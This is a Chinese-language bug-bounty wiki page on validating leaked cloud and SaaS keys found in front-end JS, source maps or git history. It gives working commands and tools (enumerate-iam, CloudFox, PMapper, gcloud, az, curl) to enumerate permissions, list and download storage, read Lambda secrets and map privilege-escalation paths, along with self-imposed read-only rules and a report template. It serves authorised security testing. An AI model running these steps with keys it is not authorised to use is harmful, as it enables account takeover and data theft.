---
type: wiki
category: attack
tool: cloud
status: active
last-updated: 2026-04-21
---

# Cloud Key / Credential 濫用

> **用途：** 從前端 JS、source map、.git 歷史找到的雲端 key 如何驗證「能做什麼」+ 「嚴重度如何」。
> 原則：**驗證 ≠ 濫用**。只做 read-only / list / describe，絕不 create/delete/modify 實際資源。

## ⚠️ 安全原則（強制）

1. ✅ 允許：`list`, `describe`, `get` — 只讀
2. ❌ 禁止：`create`, `delete`, `update`, `modify`, `put` — 會動到實際資料
3. ✅ 允許：在自己帳號下測（開獨立 test account）
4. ❌ 禁止：用受害者 key 付費 service（會燒他們的錢）
5. 報告附上：`sts get-caller-identity` 或等效輸出 + list 結果（截掉敏感名稱）

---

## 1. AWS

### 1.1 Access Key ID 偵測

```bash
# 格式：AKIAxxxxxxxxxxxxxxxx (20 chars)
# 或 ASIA (session)、AGPA (group)、AIDA (user)、AROA (role)

# Prefix 對照
echo "AKIAIOSFODNN7EXAMPLE" | cut -c1-4
# AKIA = long-term Access Key
# ASIA = temporary（有 session token，單獨 AKID 無用）
# AIDA = User ID（不是 key，別搞混）
# AROA = Role ID
```

### 1.2 基本驗證（沒有 secret 時）

```bash
# 只有 Access Key ID 沒有 Secret → 幾乎無用，除非：
# 1. 用戶帳號識別（偵測 Account ID）
aws sts get-access-key-info --access-key-id AKIAxxxxxxxxxxxx
# → 回 Account ID（即使 key 已 rotate）
# 可報：P5 Info disclosure（帳號 ID 外洩）
```

### 1.3 有 secret 時驗證

```bash
# 配新 profile（不汙染預設）
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
# (session key 則多一個)
export AWS_SESSION_TOKEN=...

# Step 1: caller identity
aws sts get-caller-identity
# {
#   "UserId": "AIDAI...",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/ci-deploy"
# }

# Step 2: 看權限（列 attached policy）
aws iam list-attached-user-policies --user-name ci-deploy
aws iam list-user-policies --user-name ci-deploy
aws iam list-attached-role-policies --role-name rolename
```

### 1.4 自動化掃權限（enumerate-iam）

```bash
# https://github.com/andresriancho/enumerate-iam
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam && pip3 install -r requirements.txt

python3 enumerate-iam.py \
  --access-key AKIA... \
  --secret-key ... \
  --region us-east-1
# → 自動 brute test 100+ API，列出 allowed actions
```

### 1.5 CloudFox（最強 recon）

```bash
# https://github.com/BishopFox/cloudfox
go install github.com/BishopFox/cloudfox@latest

# 全套檢查
cloudfox aws all-checks --profile target_key

# 找 secret / key 在 cloud 資源中
cloudfox aws secrets --profile target_key

# S3 enumeration
cloudfox aws buckets --profile target_key

# RDS / EC2 / Lambda
cloudfox aws instances --profile target_key
cloudfox aws lambdas --profile target_key
```

### 1.6 S3 濫用（常見）

```bash
# 公開 bucket 偵測
aws s3 ls s3://bucket-name/ --no-sign-request

# 用 key list
aws s3 ls s3://bucket-name/ --profile target_key

# 下載（只讀，合法）
aws s3 cp s3://bucket-name/file.txt . --profile target_key

# 遞迴列（嚴重度判定用）
aws s3 ls s3://bucket-name/ --recursive --profile target_key | head -100

# ⚠️ 不要做：aws s3 cp file s3://... （上傳 = 改動）
# ⚠️ 不要做：aws s3 rm s3://... （刪除 = 破壞）
```

### 1.7 Lambda 列函式 + 讀 env

```bash
# 列所有 function
aws lambda list-functions --profile target_key

# 讀 env（常含 secret）
aws lambda get-function-configuration --function-name FN_NAME --profile target_key
# → 看 Environment.Variables 常有 DB password, API key

# 讀 code（ZIP 下載）
aws lambda get-function --function-name FN_NAME --profile target_key
# → 回 Code.Location = S3 presigned URL，可下載 ZIP
```

### 1.8 IAM 權限升權

```bash
# 看自己 attached policy 可否 iam:CreateAccessKey / iam:PassRole
aws iam get-account-authorization-details --profile target_key > full_iam.json

# 用 PMapper 自動分析 privilege escalation path
# https://github.com/nccgroup/PMapper
pmapper --profile target_key graph create
pmapper --profile target_key visualize
pmapper --profile target_key query "who can do iam:* with *"
```

### 1.9 AWS Location Service 驗證（geo key 用）

```bash
# 這類常見於 web SPA 的 AWS_LOCATION_API_KEY
curl -s "https://maps.geo.us-east-1.amazonaws.com/maps/v0/maps/MAP_NAME/tiles/0/0/0?key=v1.public.xxx"
# 若回 tile → 確認 key 有效
# 影響評估：看 map style pricing（通常 $0.50/1000 request）
```

---

## 2. GCP

### 2.1 Service Account JSON

從 `.env`、source map、`.git` 找到 `{"type":"service_account",...}` 檔。

```bash
# 配置
gcloud auth activate-service-account --key-file=sa.json
gcloud config set project $(jq -r .project_id sa.json)

# 驗證 identity
gcloud auth list
gcloud config list
```

### 2.2 列專案 + 資源

```bash
# 看專案列表
gcloud projects list

# 權限
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:serviceAccount:NAME"

# Storage bucket
gsutil ls
gsutil ls -r gs://bucket-name/

# Compute
gcloud compute instances list

# Functions
gcloud functions list
gcloud functions describe FN_NAME
```

### 2.3 Firebase / Firestore Key

```bash
# Firebase key 格式：AIzaSy...
# 驗證方式看 wiki 21 - gau / 48 - gkey

# Firebase Realtime DB（若 rule 是 public）
curl -s "https://PROJECT.firebaseio.com/.json?auth=AIzaSy..."
# 回 { ... } → 可讀

# Firestore（REST）
curl -s "https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/USERS?key=AIzaSy..."
```

### 2.4 Google Maps API key（常見）

```bash
# 要測多個 service 才知道 key 能幹嘛
# 詳見 wiki/48-hunter-gkey.md（如果有）
# 或 tools/hunters/hunt-google-api-key.sh AIzaSy...

# 手動測
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=AIzaSy..."
curl -s "https://vision.googleapis.com/v1/images:annotate?key=AIzaSy..." \
  -d '{"requests":[{"image":{"source":{"imageUri":"https://example.com/x.jpg"}},"features":[{"type":"LABEL_DETECTION"}]}]}'
curl -s "https://translation.googleapis.com/language/translate/v2?key=AIzaSy..." \
  -d '{"q":"hi","target":"zh"}'
```

### 2.5 gcp_enum

```bash
# https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum
git clone https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum
bash gcp_enum.sh
```

---

## 3. Azure

### 3.1 Service Principal

```bash
az login --service-principal \
  -u APP_ID \
  -p SECRET \
  --tenant TENANT_ID

az account show
az account list-locations
az resource list
az storage account list
az vm list
```

### 3.2 ROADtools（專門 Azure AD）

```bash
# https://github.com/dirkjanm/ROADtools
pip3 install roadrecon
roadrecon auth -u USER -p PASS
roadrecon gather
roadrecon gui  # localhost:5000
```

### 3.3 MicroBurst

```bash
# https://github.com/NetSPI/MicroBurst
# PowerShell，Azure recon
Invoke-EnumerateAzureSubDomains -Base target
Invoke-EnumerateAzureBlobs -Base target
```

---

## 4. 其他常見 SaaS key

### 4.1 Mapbox（pk.eyJ...）

```bash
# 驗證：直接 call tile
curl -s "https://api.mapbox.com/v4/mapbox.streets/0/0/0.png?access_token=pk.eyJ..."
# 200 → key 有效
# 看 account limit: api.mapbox.com/tokens/v2?access_token=...
```

### 4.2 Algolia（長 32 chars）

```bash
# 需要 App ID + API Key
curl -X POST "https://${APP_ID}-dsn.algolia.net/1/indexes/*/queries" \
  -H "X-Algolia-Application-Id: $APP_ID" \
  -H "X-Algolia-API-Key: $KEY" \
  -d '{"requests":[{"indexName":"*","params":"query="}]}'
# 若 admin key → 可列所有 index、改 data → P2
```

### 4.3 SendGrid（SG.xxx.xxx）

```bash
curl -X GET https://api.sendgrid.com/v3/user/account \
  -H "Authorization: Bearer SG.xxx.xxx"
# ⚠️ 不要送信，只驗證存在
```

### 4.4 Twilio（AC... + token）

```bash
curl -X GET https://api.twilio.com/2010-04-01/Accounts/AC..../Balance.json \
  -u AC....:TOKEN
# 只看餘額 / subaccounts，不要打電話
```

### 4.5 Stripe（sk_live_... / pk_live_...）

```bash
# 公鑰 pk_live_ = 不 sensitive（設計用來 public）
# 私鑰 sk_live_ = 重大，可收錢 / 退款 / 讀 customer / 建 charge
# 驗證
curl https://api.stripe.com/v1/balance -u sk_live_xxx:
# ⚠️ sk_test_ 還好但 sk_live_ 碰到就回報，不要 call
```

### 4.6 Discord / Slack webhook

```bash
# Discord：https://discord.com/api/webhooks/ID/TOKEN
# 驗證（GET webhook info 是 read-only）
curl https://discord.com/api/webhooks/ID/TOKEN
# ⚠️ 不要 POST message

# Slack webhook（https://hooks.slack.com/services/...）
# 驗證方式：只能 send，所以回報時附 URL 不要 test
```

### 4.7 GitHub PAT（ghp_xxx）

```bash
# 驗證 identity
curl -H "Authorization: token ghp_xxx" https://api.github.com/user

# 列 repo 權限
curl -H "Authorization: token ghp_xxx" https://api.github.com/user/repos?per_page=1
curl -H "Authorization: token ghp_xxx" https://api.github.com/user/orgs
```

### 4.8 Docker Hub（dckr_pat_xxx）

```bash
curl -H "Authorization: Bearer $TOKEN" https://hub.docker.com/v2/users/USERNAME/
```

### 4.9 Heroku / Netlify / Vercel API

```bash
# Heroku
curl -H "Authorization: Bearer $TOKEN" https://api.heroku.com/account \
  -H "Accept: application/vnd.heroku+json; version=3"

# Netlify
curl -H "Authorization: Bearer $TOKEN" https://api.netlify.com/api/v1/user
```

---

## 5. 自動化：nuclei + trufflehog

### 5.1 trufflehog 驗證（最重要）

```bash
# TruffleHog 會自動 call 對應 API 驗證 key valid
trufflehog filesystem ./source --only-verified

# GitHub
trufflehog github --repo=https://github.com/target/repo --only-verified

# S3 bucket
trufflehog s3 --bucket=target-bucket --only-verified
```

`--only-verified` 自動過濾掉已失效的 key（極大減少誤報）。

### 5.2 nuclei cloud templates

```bash
nuclei -u https://target.com \
  -t http/exposures/tokens/ \
  -t http/exposures/apis/ \
  -severity high,critical
```

---

## 6. 評估嚴重度（重要）

| Key 類型 | 能做什麼 | 嚴重度 |
|---------|---------|-------|
| Public JS key（Google Maps public, Firebase config）| 設計是 public | P5 Info（單獨不報）|
| Google Maps key 無 restriction | 所有 Google Cloud API | P3-P4（要實測驗證）|
| AWS AKIA + Secret | 看 IAM policy（可能 full admin）| P1-P2 |
| AWS ASIA（session）| 臨時，<12h | 看權限，P1-P3 |
| GCP service account JSON | 看 role（editor/viewer/owner）| P1-P2 |
| Azure SP credential | 看 role assignment | P1-P2 |
| SendGrid full access | 偽造郵件（phishing / 重置）| P2-P3 |
| Stripe sk_live_ | 金流 | P1 |
| GitHub PAT（org admin）| 私倉讀寫 + 源碼 | P1-P2 |
| Twilio full | 打電話 / SMS / 竊聽 | P2 |
| Algolia admin key | 改 index data | P2-P3 |
| Mapbox public | 設計是 public | P5 |
| Mapbox secret | 帳號管理 | P2 |

---

## 7. 報告 template

```markdown
## 漏洞概述
https://target.com/static/main.js.map 暴露 AWS Access Key `AKIAxxx...`，
經 `aws sts get-caller-identity` 驗證為 production IAM user `prod-api-worker`，
具備 S3 read-write 權限，可讀取 100+ 個 bucket 含 customer PII。

## 發現過程

### Step 1: Source map 發現
curl -s https://target.com/static/main.js.map | \
  jq -r '.sourcesContent[]' | grep -E 'AKIA[A-Z0-9]{16}'
# → AKIAIOSFODNN7EXAMPLE

### Step 2: 驗證身分（無濫用）
aws configure --profile poc
# 輸入 key
aws sts get-caller-identity --profile poc
# {
#   "UserId": "AIDAI...",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/prod-api-worker"
# }

### Step 3: 權限列舉
aws iam list-attached-user-policies --user-name prod-api-worker --profile poc
# → AdministratorAccess

### Step 4: 證明影響範圍（list-only）
aws s3 ls --profile poc | wc -l
# 127 buckets
aws s3 ls s3://target-customer-data/ --profile poc | head -3
# [已遮蔽檔名]

### Step 5: 立即通知 + 停用
[此時請勿繼續列資料，改聯絡 PSIRT]

## Impact
- AWS account 完全接管（AdministratorAccess）
- 127 個 S3 bucket 可讀寫
- 含 customer PII（已列檔名目錄確認）
- Lambda / RDS / EC2 皆可操作

## Severity
P1 / Critical

## 修補建議
1. 立即 rotate AKIAxxx
2. 檢查 CloudTrail 2026-04-14 到今天的使用紀錄
3. source map 移除或設 access restrict
4. build pipeline 加 trufflehog pre-commit
```

---

## 8. bbflow 整合

```bash
# 找 source map / JS 中的 key
bbflow hunt target.com --only sourcemap,js-secrets,envdata,trufflehog

# 找到 AIza* Google key → 自動驗證
tools/hunters/hunt-google-api-key.sh AIzaSy...

# AWS key 用 enumerate-iam 手動驗證
# GCP SA JSON 用 gcloud
```

---

## 關聯文件

- [../hunters/hunt-envdata.sh](../hunters/hunt-envdata.sh) — JS 中的 window.envData 抓
- [../hunters/hunt-sourcemap.sh](../hunters/hunt-sourcemap.sh) — sourcesContent 挖
- [../hunters/hunt-trufflehog.sh](../hunters/hunt-trufflehog.sh) — git history 掃
- [27-tool-trufflehog.md](27-tool-trufflehog.md) — 100+ detector
- NCC Group Cloud Security Report：https://github.com/nccgroup/ScoutSuite
- SadCloud：https://github.com/nccgroup/sadcloud
